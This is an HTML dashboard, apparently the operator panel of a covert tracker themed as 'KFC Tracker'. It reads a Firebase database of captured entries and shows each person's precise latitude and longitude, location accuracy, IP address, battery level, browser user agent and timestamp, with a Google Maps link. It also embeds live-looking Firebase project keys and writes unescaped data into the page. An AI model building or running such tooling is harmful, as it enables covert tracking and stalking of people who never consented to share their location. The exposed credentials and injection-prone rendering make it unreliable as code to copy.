<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC Tracker Panel</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    .entry {
      border: 1px solid #0f0;
      padding: 10px;
      margin-bottom: 10px;
    }
    .entry a {
      color: #0ff;
    }
  </style>
</head>
<body>
  <h1>ğŸ”¥ Live Location Panel ğŸ”¥</h1>
  <div id="locationPanel">Loading...</div>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    // Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
      authDomain: "kfc-tracker.firebaseapp.com",
      databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
      projectId: "kfc-tracker",
      storageBucket: "kfc-tracker.appspot.com",
      messagingSenderId: "127099679000",
      appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
      measurementId: "G-EPEXKK3S37"
    };

    // Init Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const panel = document.getElementById("locationPanel");
    db.ref("locations").on("value", (snapshot) => {
      const data = snapshot.val();
      panel.innerHTML = ""; // clear previous

      if (data) {
        const entries = Object.values(data).reverse(); // latest first
        entries.forEach((entry, i) => {
          const lat = entry.lat || "N/A";
          const lon = entry.lon || "N/A";
          const accuracy = entry.accuracy || "N/A";
          const ip = entry.ip || "N/A";
          const battery = entry.battery || "N/A";
          const userAgent = entry.userAgent || "N/A";
          const timestamp = entry.timestamp || "N/A";
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          panel.innerHTML += `
            <div class="entry">
              <b>#${i + 1}</b><br>
              ğŸ—“ï¸ <b>Time:</b> ${timestamp}<br>
              ğŸ“ <b>Lat:</b> ${lat}<br>
              ğŸ“ <b>Lon:</b> ${lon}<br>
              ğŸ¯ <b>Accuracy:</b> ${accuracy} m<br>
              ğŸŒ <b>IP:</b> ${ip}<br>
              ğŸ”‹ <b>Battery:</b> ${battery}<br>
              ğŸ§  <b>User Agent:</b> ${userAgent}<br>
              ğŸŒ <a href="${mapsLink}" target="_blank">Open in Google Maps</a>
            </div>
          `;
        });
      } else {
        panel.innerHTML = "No data found.";
      }
    });
  </script>
</body>
</html>
